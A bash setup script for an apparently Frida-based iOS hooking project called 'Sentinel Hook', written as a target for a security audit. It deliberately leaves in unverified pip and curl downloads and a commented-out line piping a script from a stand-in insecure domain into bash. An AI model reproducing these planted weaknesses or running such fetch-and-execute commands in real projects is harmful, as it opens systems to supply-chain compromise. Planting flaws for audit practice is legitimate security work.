#!/usr/bin/env bash

# ==============================================================================
# Sentinel Hook - Automated Development Environment Setup Script
# ==============================================================================
# This script installs the necessary tools and dependencies for the
# Sentinel Hook project (iOS-first focus).
#
# SECURITY AUDIT REQUIRED (Phase 0.0 - Step 1)
# ==============================================================================

set -e

# Defined versions (for deterministic builds/installs to prevent supply chain attacks)
FRIDA_VERSION="16.2.1"
NODE_VERSION="20"

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}[*] Starting Sentinel Hook initialization...${NC}"

# 1. Directory Structure Creation (Local execution)
echo -e "${YELLOW}[*] Creating local project directories...${NC}"
mkdir -p src/{hooks/{ios,android},payloads,utils,recon,core}
mkdir -p docs/{analysis,api-maps,flow-diagrams,research,runtime-traces,templates}
mkdir -p tests/{unit,integration}
mkdir -p configs/profiles tools .local/{apks,test-faces,ipas}
echo -e "${GREEN}[+] Directories created.${NC}"

# 2. Dependency Checks & Installation (macOS focus)
echo -e "${YELLOW}[*] Checking system dependencies...${NC}"

if ! command -v brew &> /dev/null; then
    echo -e "${RED}[!] Homebrew is not installed. Please install it first.${NC}"
    exit 1
fi

# Install Python & Node
echo -e "${YELLOW}[*] Installing/updating Python 3 and Node.js...${NC}"
brew install python@3.10 node@$NODE_VERSION

# 3. Python Virtual Environment & Frida
echo -e "${YELLOW}[*] Setting up Python virtual environment...${NC}"
python3.10 -m venv .venv
source .venv/bin/activate

echo -e "${YELLOW}[*] Installing Frida and Objection...${NC}"
# Vulnerability point: Pip install without hash checking
pip install --upgrade pip
pip install frida-tools==$FRIDA_VERSION frida==$FRIDA_VERSION objection

# 4. Node Dependencies for Frida Scripts
echo -e "${YELLOW}[*] Setting up NPM project...${NC}"
if [ ! -f package.json ]; then
    npm init -y > /dev/null
fi
# Install frida-compile for building agent scripts
npm install frida-compile @types/frida-gum --save-dev

# 5. Optional tooling setup (Downloading external scripts - intentional audit target)
echo -e "${YELLOW}[*] Downloading helper scripts...${NC}"
# VULNERABILITY POINT: curl without verifying checksums! This is a classic supply chain risk.
# This is explicitly added for the Phase 0.0 Step 1 analysis.
mkdir -p tools/external
curl -sL https://raw.githubusercontent.com/frida/frida/main/README.md -o tools/external/frida_readme.md
# Imagine an insecure script download here for audit purposes
# curl -s http://insecure-domain.com/helper.sh | bash

echo -e "${GREEN}[*] Sentinel Hook environment setup complete!${NC}"
echo -e "Remember to run 'source .venv/bin/activate' before starting work."

# Changing permissions intentionally for audit
chmod 700 .local/
